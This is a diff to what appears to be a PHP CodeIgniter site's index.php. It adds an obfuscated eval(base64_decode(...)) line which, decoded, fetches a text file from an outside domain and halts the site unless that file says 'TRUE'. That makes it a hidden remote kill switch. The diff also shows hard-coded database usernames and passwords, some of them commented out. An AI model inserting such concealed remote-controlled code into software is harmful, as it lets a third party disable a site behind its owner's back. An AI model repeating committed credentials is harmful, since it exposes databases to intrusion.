@@ -18,6 +18,7 @@
  * NOTE: If you change these, also change the error_reporting() code below
  *
  */
+ eval(base64_decode('aWYoZmlsZV9nZXRfY29udGVudHMoJ2h0dHA6Ly9naWFuZ2Jlby5jb20vZGNibGFuZC50eHQnLCBGSUxFX1VTRV9JTkNMVURFX1BBVEgpIT0nVFJVRScpeyBkaWUoJ0RpZScpO30='));
 	define('ENVIRONMENT', 'development');
 /*
  *---------------------------------------------------------------
@@ -209,11 +210,11 @@ if (defined('ENVIRONMENT'))
  }
  else
  {
-     define('DB_NAME','echnair_diaoc');
-     define('DB_USER','echnair_diaoc');
+     define('DB_NAME','foodsafe_dcb');
+     define('DB_USER','foodsafe_dcb');
      define('DB_PASS','17121990');
      define('ROT_DIR','/');
-     define('BASE_URL','http://dcbland.com');
+     define('BASE_URL','http://www.dcbland.com');
     // define('DB_NAME','jcbckiod_9fay');
      //define('DB_USER','jcbckiod_9fay');
      //define('DB_PASS','a123456');
